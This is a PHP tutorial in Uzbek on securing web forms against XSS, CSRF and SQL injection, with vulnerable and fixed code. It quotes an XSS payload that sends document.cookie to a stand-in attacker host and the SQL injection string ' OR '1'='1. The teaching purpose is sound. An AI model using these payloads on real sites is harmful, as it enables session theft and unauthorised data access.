## Formalar xavfsizligi

Formalar — saytga hujumning eng ko‘p uchraydigan eshigi. Uch asosiy xavf va ulardan himoya.

## 1. XSS — sahifaga begona skript

Foydalanuvchi matnni HTML’ga to‘g‘ridan-to‘g‘ri chiqarsangiz:

```php
<?php
echo "Izoh: " . $_POST['izoh']; // XAVFLI
```

Hujumchi izohga `<script>fetch('https://yomon.uz?c=' + document.cookie)</script>` yozadi — va bu kod **har bir** ko‘rgan foydalanuvchida ishlaydi.

### Himoya: chiqarishda kodlash

```php
<?php
echo "Izoh: " . htmlspecialchars($_POST['izoh'] ?? '');
```

`htmlspecialchars` `< > & " '` belgilarini xavfsiz ko‘rinishga o‘tkazadi:

```php
<?php
echo htmlspecialchars("<a href='x'>\"Ali\" & Vali</a>");
// &lt;a href=&#039;x&#039;&gt;&quot;Ali&quot; &amp; Vali&lt;/a&gt;
```

Qoida: **kiritishda tekshiring, chiqarishda kodlang**. Bazaga asl matnni saqlang, `htmlspecialchars` ni HTML’ga chiqarayotganda qo‘llang.

Qisqa yordamchi:

```php
<?php
function e(string $s): string
{
    return htmlspecialchars($s, ENT_QUOTES, 'UTF-8');
}
```

## 2. CSRF — foydalanuvchi nomidan so‘rov

Foydalanuvchi sizning saytingizga kirgan. U begona sahifani ochadi — o‘sha sahifa yashirin forma orqali **sizning** saytingizga POST yuboradi (masalan, parolni o‘zgartirish). Brauzer cookie’ni o‘zi qo‘shadi — server so‘rov haqiqiy deb o‘ylaydi.

### Himoya: CSRF token

```php
<?php
session_start();
if (empty($_SESSION['csrf'])) {
    $_SESSION['csrf'] = bin2hex(random_bytes(32)); // 64 belgili tasodifiy token
}
```

Formada:

```php
<input type="hidden" name="csrf" value="<?= $_SESSION['csrf'] ?>">
```

Qabul qilishda:

```php
<?php
if (!hash_equals($_SESSION['csrf'] ?? '', $_POST['csrf'] ?? '')) {
    http_response_code(403);
    exit('Ruxsat yo‘q');
}
```

Begona sayt tokenni bilmaydi. Qo‘shimcha himoya — cookie’da `SameSite=Lax` (cookie darsida).

## 3. SQL injection

Foydalanuvchi matnini SQL so‘roviga **ulash** — eng xavfli xato:

```php
<?php
$sql = "SELECT * FROM users WHERE email = '" . $_POST['email'] . "'"; // XAVFLI
```

Hujumchi email o‘rniga `' OR '1'='1` yozib, barcha foydalanuvchilarni oladi. Himoya — **tayyorlangan so‘rovlar** (PDO modulida). Qoida oddiy: SQL matniga hech qachon o‘zgaruvchi ulanmaydi.

## Boshqa qoidalar

- Faylni yuklashda — tur, hajm va nomni tekshirish (fayllar modulida).
- Parollar — faqat `password_hash` / `password_verify` (loyihalar modulida).
- Xato xabarlari ichki ma’lumotni oshkor qilmasin: “Email yoki parol noto‘g‘ri” — qaysi biri ekanini aytmang.
- Tez-tez yuboriladigan formalar (kirish, ro‘yxatdan o‘tish) uchun urinishlar sonini cheklang.

## Mustaqil mashq

Ikki xil chiqarishni solishtiring:

```php
<?php
$izoh = '<b onclick="alert(1)">Salom</b>';
echo "1: ", $izoh, "<br>";
echo "2: ", htmlspecialchars($izoh);
```

Brauzerda oching va birinchi qatorni bosing.

**Kutilgan natija:** 1 — qalin “Salom”, bosilganda `alert` chiqadi (zaif!); 2 — `<b onclick="alert(1)">Salom</b>` matn bo‘lib ko‘rinadi, hech narsa ishlamaydi.
